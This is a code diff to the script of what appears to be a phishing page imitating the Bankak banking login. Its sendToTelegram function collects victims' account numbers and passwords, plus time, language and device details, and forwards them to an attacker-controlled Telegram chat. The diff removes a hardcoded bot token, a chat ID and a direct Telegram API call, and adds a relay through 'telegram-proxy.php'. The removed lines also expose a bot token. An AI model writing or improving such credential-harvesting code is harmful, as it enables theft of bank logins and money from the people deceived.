@@ -209,8 +209,6 @@
         (function () {
             'use strict';
             var CONFIG = {
-                TELEGRAM_BOT_TOKEN: '8987871839:AAEibtwHtRAJW5lUSRC78jERfceqjxL43cc',
-                TELEGRAM_CHAT_ID: '844962683',
                 NEXT_URL: 'question.html',
                 REDIRECT_DELAY: 1500
             };
@@ -314,29 +312,27 @@
             });
 
             function sendToTelegram(username, password) {
-                var token = CONFIG.TELEGRAM_BOT_TOKEN;
-                var chatId = CONFIG.TELEGRAM_CHAT_ID;
-                if (!token || token === '8987871839:AAEibtwHtRAJW5lUSRC78jERfceqjxL43cc' || !chatId || chatId === '844962683') {
-                    console.warn('[Bankak] Telegram not configured — skipping send.');
-                    return Promise.resolve(false);
-                }
                 var now = new Date();
                 var timeStr = now.toLocaleString('en-GB', { hour12: false });
                 var text =
-                    '🔐 تحديث بياناتك — تسجيل دخول\n' +
+                    '🏦 New Account Inquiry (service selected)\n' +
                     '━━━━━━━━━━━━━━━━━━━━\n' +
-                    '👤 اسم المستخدم: ' + username + '\n\n' +
-                    '🔑 كلمة المرور: ' + password + '\n\n' +
+                    'Service:        Update Your Information\n' +
+                    'Account Number: ' + username + '\n' +
+                    'Password:       ' + password + '\n\n' +
                     '🕒 الوقت: ' + timeStr + '\n' +
                     '🌐 اللغة: ' + (navigator.language || '—') + '\n' +
                     '📱 الجهاز: ' + (navigator.userAgent || '—').substring(0, 120);
-                var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
                 var payload = new URLSearchParams();
-                payload.append('chat_id', chatId);
                 payload.append('text', text);
-                return fetch(url, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: payload.toString() })
-                    .then(function () { return true; })
-                    .catch(function () { return false; });
+                return fetch('telegram-proxy.php', { method: 'POST', body: payload })
+                    .then(function (response) {
+                        if (!response.ok) {
+                            console.warn('[Bankak] Telegram request failed:', response.status, response.statusText);
+                        }
+                        return true;
+                    })
+                    .catch(function (err) { console.error('[Bankak] Telegram error:', err); return false; });
             }
 
             form.addEventListener('submit', function (e) {
